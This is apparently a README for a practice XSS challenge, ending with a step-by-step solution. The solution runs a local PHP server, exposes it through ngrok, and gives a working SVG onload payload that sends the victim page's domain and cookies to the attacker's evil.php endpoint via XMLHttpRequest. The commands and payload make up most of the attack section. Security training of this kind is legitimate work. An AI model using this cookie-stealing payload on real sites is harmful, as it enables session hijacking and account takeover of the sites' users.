Vulnerable html page contains cookie.
Let's Steal the cookie with evil.php

If you can't solve, look solution 


Are you build your evil payload ?
Let's try ->  https://cyb3rsalih.github.io/xss-challenge/



Please let me know if any problem... PR's wellcome :)


======= SOLUTION ======= 

1- Create your local php server in folder where evil.php 
` php -S localhost:1234 `

2- Connect your local server to internet
` ngrok http 1234 `

3- Your address is something like this
` http://xxxxxxxxx.ngrok.io `


4- Now add your XSS payload to vulnerable input.
`
<svg onload="function a(){var url = `http://xxxxxxxxx.ngrok.io/evil.php?domain=${document.domain}&cookie=${document.cookie}`;var r=new XMLHttpRequest();r.open('GET', url, true);r.send();};a();">
`